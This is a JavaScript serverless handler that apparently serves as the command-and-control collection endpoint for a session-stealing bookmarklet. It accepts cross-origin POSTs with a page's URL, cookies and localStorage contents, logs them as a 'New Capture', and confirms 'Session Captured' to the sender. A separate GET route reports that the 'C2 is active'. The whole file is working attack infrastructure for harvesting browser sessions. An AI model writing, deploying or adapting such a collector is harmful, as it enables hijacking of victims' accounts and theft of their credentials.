// api/ingest.js
export default function handler(req, res) {
  // 1. HANDLE CORS (CRITICAL FOR BOOKMARKLETS)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight request
  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  if (req.method === 'POST') {
    const data = req.body;
    
    // 2. LOG TO VERCEL DASHBOARD
    // You will see this in the "Functions" tab of Vercel
    console.log(`🎯 [C2 INGEST] New Capture`);
    console.log(`   Name: ${data.name || 'Unknown'}`);
    console.log(`   URL: ${data.url}`);
    console.log(`   Cookies: ${data.cookies}`);
    console.log(`   LocalStorage: ${JSON.stringify(data.ls)}`);
    console.log(`   Timestamp: ${data.ts}`);

    // 3. RETURN CONFIRMATION
    // The bookmarklet will read this to show the "Success" message
    return res.status(200).json({ 
      success: true, 
      message: 'Session Captured',
      id: 'test123',
      timestamp: new Date().toISOString() 
    });
  }

  if (req.method === 'GET') {
    // This is for your dashboard polling
    return res.status(200).json({
      success: true,
      message: 'C2 is active',
      timestamp: new Date().toISOString()
    });
  }

  return res.status(405).json({ error: 'Method Not Allowed' });
}
